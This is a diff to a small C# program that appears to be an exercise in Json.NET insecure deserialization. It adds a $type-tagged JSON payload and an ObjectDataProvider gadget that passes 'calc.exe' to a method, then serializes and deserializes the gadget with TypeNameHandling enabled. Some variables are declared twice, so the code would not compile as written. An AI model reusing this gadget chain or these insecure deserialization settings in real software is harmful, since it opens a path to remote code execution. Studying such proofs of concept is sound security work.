@@ -1,6 +1,9 @@
-﻿using System.Diagnostics;
+﻿using System.Reflection;
+using System.Runtime.Serialization.Json;
+using System.Diagnostics;
 using System;
 using Newtonsoft.Json;
+using System.Windows.Data;
 
 namespace json
 {
@@ -20,6 +23,32 @@ namespace json
                 TypeNameHandling = TypeNameHandling.All,
             });
             Console.WriteLine(testString1);
+
+            string payload = "{\"$type\":\"json.TestClass, json, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null\",\"Name\":\"nealneal\",\"Age\":18}";
+            Object obj = JsonConvert.DeserializeObject<TestClass>(payload, new JsonSerializerSettings
+            {
+                TypeNameHandling = TypeNameHandling.None,
+            });
+            Type t = obj.GetType();
+            PropertyInfo propertyName = t.GetProperty("Name");
+            object objName = propertyName.GetValue(obj, null);
+            Console.WriteLine(obj);
+            Console.WriteLine(((TestClass)obj).Name);
+
+            ObjectDataProvider odp = new ObjectDataProvider();
+            odp.MethodName = "ClassMethod";
+            odp.MethodParameters.Add("calc.exe");
+            odp.ObjectInstance = testClass;
+            string payload = JsonConvert.SerializeObject(odp, new JsonSerializerSettings
+            {
+                TypeNameHandling = TypeNameHandling.All,
+                TypeNameAssemblyFormatHandling = TypeNameAssemblyFormatHandling.Full,
+            });
+
+            Object obj = JsonConvert.DeserializeObject<Object>(payload, new JsonSerializerSettings
+            {
+                TypeNameHandling = TypeNameHandling.Auto,
+            });
         }
     }
 
